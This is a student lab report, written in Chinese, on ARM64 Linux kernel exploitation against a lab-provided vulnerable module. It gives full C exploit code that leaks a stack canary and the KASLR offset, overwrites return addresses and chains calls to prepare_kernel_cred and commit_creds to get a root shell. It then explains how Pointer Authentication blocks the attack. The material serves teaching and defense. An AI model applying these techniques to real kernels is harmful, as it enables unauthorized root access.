---
counter: True
comment: True
---

# Linux 内核 ROP 攻击与防护

!!! abstract
    系统安全 lab2 实验报告

    !!! warning "仅供学习参考，请勿抄袭"

## 实验目标

- 了解 ARM64 栈的布局，学习 buffer overflow 漏洞的原理与利用方式
- 了解 stack canary 与 KASLR 等抵御 buffer overflow 漏洞的原理，并学会如何绕过这些防护机制
- 学习 return-oriented programming (ROP) 攻击原理，获取 Linux 内核的 root 权限
- 学习 ARMV8.3 PA (Pointer Authentication) 原理，了解 Linux 内核如何利用 PA 机制防止 ROP 攻击

## 实验过程

### Task 1

需要泄漏出 canary 值并且根据 ra 计算出当前 KASLR 的偏移值。首先观察 zjubof_read 和 zjubof_write4 的代码：

```c
static ssize_t zjubof_read (struct file *file, char __user *buffer, size_t len, loff_t *offset)
{
    int ret = 0;
    if(len >= CMD_LENGTH)
        return -EINVAL;
    ret = copy_to_user(buffer, prev_cmd, len);
    return ret;
}

ssize_t zjubof_write4(char *buffer,size_t len)
{
    struct cmd_struct cmd;   
    printk("zjubof_write4\n");
    memset(cmd.command, 0, 16);
    cmd.length = len;
    if(cmd.length > 16)
        cmd.length = 16;
    memcpy(cmd.command, buffer, len);
    memcpy(prev_cmd,cmd.command, cmd.length);
    printk("cmd :%s len:%ld\n", cmd.command,len);
    return 0;
}
```

read 从全局变量 prev_cmd 中获取 len 长度的值。write 规定 cmd.length 不超过 16，但 memcpy 时先用的 len，此处可以溢出覆盖掉 cmd.length，后面就可以将泄漏的内容写入 prev_cmd 供读取了。通过 objdump 我们知道 cmd 在 zjubof_write4 的最底端，可以直接溢出到 zjubof_write3 的函数帧栈中，整体结构如下：

```text
buf+00  cmd.command[0:8]    ┐
buf+08  cmd.command[8:16]   ├ zjubof_write4
buf+16  cmd.length          ┘
buf+24  canary              ┐
buf+32  old frame pointer   ├ zjubof_write3
buf+40  return address      ┘
```

所以我们只需要写入 16+8 个字节，前 16 个字节占满 cmd.command，后 8 个字节覆盖掉 cmd.length 修改为 48 就可以将上述 6 个八字节的值复制到 prev_cmd 中，再通过 read 泄漏出来。

得到 ra 后，我们就可以根据 zjubof_write2 中调用 zjubof_write3 时下一条指令的地址与存在栈上的 lr 比较来计算出 KASLR 的偏移量：

```text
ffff800010de7cb4 <zjubof_write2>:
...
ffff800010de7d08:	97ffffdc 	bl	ffff800010de7c78 <zjubof_write3>
ffff800010de7d0c:	f9410fe0 	ldr	x0, [sp, #536]
...
```

为了更方便地进行 8 字节 buffer 与 size_t 值的转换，可以使用一个 struct+union：

```c 
struct uint64_mem {
    union {
        size_t val;
        char buf[8];
    };
} canary, ra;
```

这样通过 canary.buf 进行的赋值就可以直接通过 canary.val 读取。完整的 exp 如下：

```c 
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

size_t original_ra = 0xffff800010de7d0c, offset;

struct uint64_mem {
    union {
        size_t val;
        char buf[8];
    };
} canary, ra;

void leak_info(int fd) {
    char buf[0x100] = "AAAAAAAAAAAAAAAA\x30";
    write(fd, buf, 16 + 8);
    read(fd, buf, 48);
    memcpy(canary.buf, buf + 24, 8);
    memcpy(ra.buf, buf + 40, 8);
    printf("[+] canary: \t0x%lx\n", canary.val);
    printf("[+] ra: \t0x%lx\n", ra.val);
    offset = ra.val - original_ra;
    printf("[+] offset: \t0x%lx\n", offset);
}

int main() {
    int fd = open("/dev/zjubof", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    leak_info(fd);
    close(fd);
    return 0;
}
```

通过 aarch64-linux-gnu-gcc -static exp.c -o exp 编译后将 exp 放入 share 文件夹中。然后 ./start.sh 通过 qemu 启动 kernel，在 kernel 中 cd /mnt/share 后 ./exp 即可运行 exp 得到泄漏的 canary 和 offset：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/lab2/task1.png" width="60%" style="margin: 0 auto;">
</div>

### Task 2

需要修改 zjubof_write3 的返回地址，跳转到 first_level_gadget 进行提权，然后运行 shell。栈的结构同样如上分析：

```text
buf+00  cmd.command[0:8]    ┐
buf+08  cmd.command[8:16]   ├ zjubof_write4
buf+16  cmd.length          ┘
buf+24  canary              ┐
buf+32  old frame pointer   ├ zjubof_write3
buf+40  return address      ┘
```

只需要写入一下构造好的 buf 即可，Task 1 中我们得到了 canary，在这里写入的时候填入泄露的 canary 即可绕过栈溢出保护，接着 fp 不用管，ra 需要在 objdump 找到的预期跳转地址上加上 KASLR 偏移量即可。这里我们需要跳转到 first_level_gadget 的第二条指令处，因为在 zjubof_write3 返回时栈的状态已经恢复到了 zjubof_write2 的帧栈，这里我们想要的是在它的帧栈中运行 first_level_gadget 函数，不需要再调整 sp，所以需要跳过第一条 stp 指令。

```text
ffff8000107abd78 <first_level_gadget>:
ffff8000107abd78:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
ffff8000107abd7c:	d2800000 	mov	x0, #0x0                   	// #0
...
```

在 first_level_gadget 中我们可以发现最后返回前将 sp 加了 0x220，这是因为 zjubof_write2 的帧栈大小是 0x220，zjubof_write3 的帧栈大小是 32，zjubof_write4 的帧栈大小是 80。在每个函数调用的开头会给 sp 减去帧栈大小来开辟空间，结束后给 sp 加回来恢复到调用者的帧栈。而在 zjubof_write3 返回的时候已经恢复到了 zjubof_write2 的帧栈，要想在提权后正常返回到 zjubof_write，不能通过函数正常的退出流程，需要自己还原现场并手动 ret 返回。在这里就体现为手动 load 回 x29 x30 x19 x20 x21 并将 sp 加上 0x220，然后 ret 即可返回到 zjubof_write2 的帧栈中。

这部分的 exp 如下：

```c 
size_t first_level_gadget = 0xffff8000107abd7c;

void task2(int fd) {
    char buf[0x100] = {0};
    struct uint64_mem fake_ra;
    fake_ra.val = first_level_gadget + offset;
    memcpy(buf + 24, canary.buf, 8);
    memcpy(buf + 40, fake_ra.buf, 8);
    write(fd, buf, 48);
    system("/bin/sh");
}
```

在 Task 1 的基础上 leak_info 后调用 task2(fd) 即可完成提权：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/lab2/task2.png" width="60%" style="margin: 0 auto;">
</div>

可见运行 /bin/sh 时的用户变为了 root，且可以读取到 flag 内容为 sysde655sEc。

### Task 3

在这个 task 中不能直接通过 first_level_gadget 提权，需要手动调用 prepare_kernel_cred 和 commit_creds 提权，然后再通过 second_level_gadget 跳回 zjubof_write。所以我们只需要覆盖更多栈空间，将整个栈布局为如下：

```text
buf+000 cmd.command[0:8]    ┐
buf+008 cmd.command[8:16]   ├ zjubof_write4
buf+016 cmd.length          ┘
buf+024 canary              ┐
buf+032 old frame pointer   ├ zjubof_write3
buf+040 return address      │                  -> to prepare_kernel_cred
buf+048                     │
buf+056                     ┘
buf+064 old frame pointer   ┐
buf+072 return address      │                  -> to commit_creds
buf+080                     ├ prepare_kernel_cred
buf+088                     ┘
buf+096 old frame pointer   ┐
buf+104 return address      │                  -> to second_level_gadget
buf+112                     ├ commit_creds
buf+120                     │
buf+128                     │
buf+136                     ┘
buf+144 old frame pointer   ┐
buf+152 return address      │                  -> to zjubof_write2 ra
buf+160                     ├ second_level_gadget
...
```

这样在 zjubof_write3 返回的时候就会跳转到 prepare_kernel_cred 处，同理我们为它设置好了栈，所以需要跳过函数 prelude，然后正常结束的时候会抹掉这个帧栈并返回到我们设置好的 commit_creds 处，以此类推到 second_level_gadget，这里在回到 zjubof_write 前同理也需要调整栈，我们之前将 sp 减了 0x220，这里的 prepare_kernel_cred 和 commit_creds 返回的时候已经分别减少了 32 和 48，所以 second_level_gadget 中只需要减少 0x220 - 32 - 48 = 0x1d0 即可。

按照上方的帧栈分析进行布局即可，这部分的 exp 如下：

```c
size_t first_level_gadget = 0xffff8000107abd7c;     // 去除了 prelude
size_t prepare_kernel_cred = 0xffff8000100a6214;    // 去除了 prelude
size_t commit_creds = 0xffff8000100a5f6c;           // 去除了 prelude
size_t second_level_gadget = 0xffff8000107abdb0;    // 去除了 prelude
size_t final_ra = 0xffff8000107abe54;

void task3(int fd) {
    char buf[0x200] = {0};
    struct uint64_mem ra1, ra2, ra3, ra4;
    ra1.val = prepare_kernel_cred + offset;
    ra2.val = commit_creds + offset;
    ra3.val = second_level_gadget + offset;
    ra4.val = final_ra + offset;
    memcpy(buf + 24, canary.buf, 8);
    memcpy(buf + 40, ra1.buf, 8);
    memcpy(buf + 72, ra2.buf, 8);
    memcpy(buf + 104, ra3.buf, 8);
    memcpy(buf + 152, ra4.buf, 8);
    write(fd, buf, 160);
    system("/bin/sh");
}
```

同样运行，即可进行提权：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/lab2/task3.png" width="60%" style="margin: 0 auto;">
</div>

### Task 4

启用 ARMv8.3 PA 之后编译内核，并同样运行，修改 exp 中已知地址后运行 exp 仍出现段错误：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/lab2/task4.png" width="60%" style="margin: 0 auto;">
</div>

观察 zjubof_write3 的汇编：

```text
ffff800010eb6ccc <zjubof_write3>:
ffff800010eb6ccc:	d503245f 	hint	#0x22
ffff800010eb6cd0:	d503233f 	paciasp
ffff800010eb6cd4:	a9be7bfd 	stp	x29, x30, [sp, #-32]!
ffff800010eb6cd8:	910003fd 	mov	x29, sp
ffff800010eb6cdc:	a90153f3 	stp	x19, x20, [sp, #16]
ffff800010eb6ce0:	aa0003f3 	mov	x19, x0
ffff800010eb6ce4:	aa0103f4 	mov	x20, x1
ffff800010eb6ce8:	f0003720 	adrp	x0, ffff80001159d000 <kallsyms_token_index+0xd7298>
ffff800010eb6cec:	91188000 	add	x0, x0, #0x620
ffff800010eb6cf0:	97ffe556 	bl	ffff800010eb0248 <_printk>
ffff800010eb6cf4:	aa1403e1 	mov	x1, x20
ffff800010eb6cf8:	aa1303e0 	mov	x0, x19
ffff800010eb6cfc:	97ffffc7 	bl	ffff800010eb6c18 <zjubof_write4>
ffff800010eb6d00:	d2800000 	mov	x0, #0x0                   	// #0
ffff800010eb6d04:	a94153f3 	ldp	x19, x20, [sp, #16]
ffff800010eb6d08:	a8c27bfd 	ldp	x29, x30, [sp], #32
ffff800010eb6d0c:	d50323bf 	autiasp
ffff800010eb6d10:	d65f03c0 	ret
```

hint 指令可以忽略，所以本质上其多了 paciasp 和 autiasp 两条指令。这两条指令由 ARMv8.3 的 Pointer Authentication 机制引入，原理是在存储指针时在地址高位添加签名，使得栈上存储的返回地址不是裸的返回地址，而是带有签名的返回地址。因此也可见在 leak_info 函数的输出中 ra 的值并非为 0xfff 开头的虚拟地址，而是 0x4ad... 这样的地址。

paciasp 指令会为当前返回地址添加 PAC 签名，之后再通过 stp 存入栈上。函数返回前会通过 autiasp 指令验证返回地址的 PAC 签名并恢复为裸的返回地址。这也就使得了中间对于 ra 的修改会使得 autiasp 验证无效从而抛出异常。也使得了通过修改返回地址进行的攻击更加困难。

## 思考题

> 1. **为什么 Linux canary 的最低位 byte 总是 \00？**

因为 canary 值以小端序存入，这样在低位的地址就是 \x00，如果下一个函数帧栈的最高位局部变量是字符串，那么这个 \x00 就会保证该字符串的后面一定有一个 \0，如果打印该字符串或者通过 strcpy 进行拷贝都会停止在 canary 前，降低了 canary 泄漏的风险。但是对于本次实验中通过 memcpy 进行拷贝是没有作用的。

> 2. **在 ARM64 的 ROP 中，在 zjubof_write4 中 overflow 覆盖到的返回地址，会在什么时候/执行到哪个函数哪一行的时候被 load 到 pc 寄存器？**

在 zjubof_write4 中覆盖的返回地址会在 zjubof_write3 返回时也就是最后 postlude 中 ldp 读取了 x29 x30 后通过 ret 指令 load 到 pc 寄存器：

```text
ffff800010de7c78 <zjubof_write3>:
...
ffff800010de7ca8:	a94153f3 	ldp	x19, x20, [sp, #16]
ffff800010de7cac:	a8c27bfd 	ldp	x29, x30, [sp], #32
ffff800010de7cb0:	d65f03c0 	ret
```

> 3. **在 Task 2 中，为什么在 exp 中直接覆盖返回地址为 first_level_gadget 的汇编第一行地址，会造成 kernel 在运行到这一行的时候产生 panic？并写出造成这个 panic 的触发链。**

在运行 first_level_gadget 第一条指令前的栈结构如下：

```text
sp      old frame pointer   ┐
sp+08   return address      │                  -> to zjubof_write
sp+16                       ├ zjubof_write2
sp+24                       ┘
```

这时的栈已经恢复到了 zjubof_write2 的栈上，这里的 ra 是预期的 zjubof_write 中的地址。而如果这时运行 first_level_gadget 的第一行，就会执行 stp	x29, x30, [sp, #-16]! 指令，将当前的 x29 x30 保存到 sp-16 的位置并为 sp 减 16，而这时存储的 ra(x30) 仍然是我们伪造的 first_level_gadget 的地址，所以栈结构如下：

```text
sp      old frame pointer   ┐
sp+08   return address      ┘                  -> to first_level_gadget  
sp+16   old frame pointer   ┐
sp+24   return address      │                  -> to zjubof_write
sp+32                       ├ zjubof_write2
sp+40                       ┘
```

这样在 first_level_gadget 中会 sp-=0x220 调整 sp 后立即返回到 ra 处，而这个 ra 恰好又是 first_level_gadget 第一行。所以会这样不断反复进入 first_level_gadget，不断将 sp 减小，直到爆栈。可以验证，直接覆盖为第一行地址后的 panic 信息如下：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/lab2/panic.png" width="60%" style="margin: 0 auto;">
</div>

可见 task 的栈空间为 [0xffff8000102d8000..0xffff8000102dc000] 而当前 sp 为 0xffff8000102dc170，已经超出了栈空间，而在处理异常的时候又因为 Insufficient stack space to handle exception! 导致了 kernel panic。

> 4. **Linux 内核是如何利用 ARM PA 来防御 ROP 攻击的**

Linux 内核利用 ARM PA 的 paciasp 和 autiasp 指令来对返回地址进行签名和验证，这样在存储返回地址时会将其签名，而在返回时会验证签名，如果签名不匹配则会抛出异常。这样就使得了在内核中进行 ROP 攻击变得更加困难，详细分析见 Task 4。
